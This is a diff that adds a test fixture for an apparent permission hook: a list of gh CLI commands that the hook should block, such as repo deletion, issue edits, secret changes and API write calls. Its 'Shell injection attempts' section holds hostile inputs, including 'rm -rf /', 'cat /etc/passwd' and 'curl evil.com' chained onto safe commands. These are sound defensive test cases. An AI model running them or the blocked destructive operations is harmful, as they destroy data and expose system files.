@@ -1,0 +1,88 @@
+# Commands that should be BLOCKED by the gh-permission-hook
+# Format: one command per line, lines starting with # are comments
+
+# Repository destructive operations
+gh repo delete owner/repo
+gh repo create new-repo
+gh repo edit --description "test"
+gh repo rename new-name
+gh repo archive
+
+# Issue destructive operations
+gh issue close 123
+gh issue delete 123
+gh issue create --title "Test"
+gh issue edit 123 --title "New title"
+gh issue transfer 123 other-repo
+gh issue pin 123
+gh issue unpin 123
+
+# Release destructive operations
+gh release delete v1.0.0
+gh release create v2.0.0
+gh release edit v1.0.0
+
+# Gist destructive operations
+gh gist delete abc123
+gh gist create test.txt
+gh gist edit abc123
+
+# Workflow destructive operations
+gh run cancel 789
+gh run rerun 789
+gh workflow disable test.yml
+
+# Auth operations
+gh auth logout
+
+# Config write operations
+gh config set editor vim
+
+# Label operations
+gh label create test-label
+gh label edit test-label
+gh label delete test-label
+
+# Secret and variable management
+gh secret set MY_SECRET
+gh secret delete MY_SECRET
+gh variable set MY_VAR
+gh variable delete MY_VAR
+
+# Destructive gh api commands
+gh api --method POST /repos/owner/repo/issues
+gh api --method=POST /repos/owner/repo/issues
+gh api --method DELETE /repos/owner/repo
+gh api --method=DELETE /repos/owner/repo
+gh api -X POST /repos/owner/repo/issues
+gh api -X=POST /repos/owner/repo/issues
+gh api -X DELETE /repos/owner/repo
+gh api -X=DELETE /repos/owner/repo
+gh api -X PUT /repos/owner/repo
+gh api -X PATCH /repos/owner/repo
+gh api --input data.json /repos/owner/repo/issues
+gh api -f title=test /repos/owner/repo/issues
+gh api --field title=test /repos/owner/repo/issues
+gh api -F file=@data.json /repos/owner/repo/issues
+
+# GraphQL mutations (write operations)
+gh api graphql -f query="mutation { createIssue(input: {repositoryId: \"123\", title: \"test\"}) { issue { id } } }"
+gh api graphql -f query='mutation { addComment(input: {subjectId: "123", body: "test"}) { commentEdge { node { id } } } }'
+gh api graphql -f query="mutation ResolveThread { resolveReviewThread(input: {threadId: \"abc\"}) { thread { isResolved } } }"
+gh api graphql -f query="mutation { deleteIssue(input: {issueId: \"123\"}) { repository { id } } }"
+
+# Shell injection attempts (should be blocked even if command looks safe)
+gh pr view 123; rm -rf /
+gh pr view 123 && rm -rf /
+gh pr view 123 || rm -rf /
+gh pr view 123 | cat /etc/passwd
+gh pr view $(whoami)
+gh pr view `whoami`
+gh pr view 123 & background_cmd
+gh issue list; malicious_command
+gh api /repos/owner/repo; curl evil.com
+
+# Env var prefix with destructive command (gh command should be extracted and blocked)
+GH_TOKEN=xxx gh repo delete owner/repo
+env GH_TOKEN=xxx gh issue close 123
+GH_TOKEN=secret gh api --method DELETE /repos/owner/repo
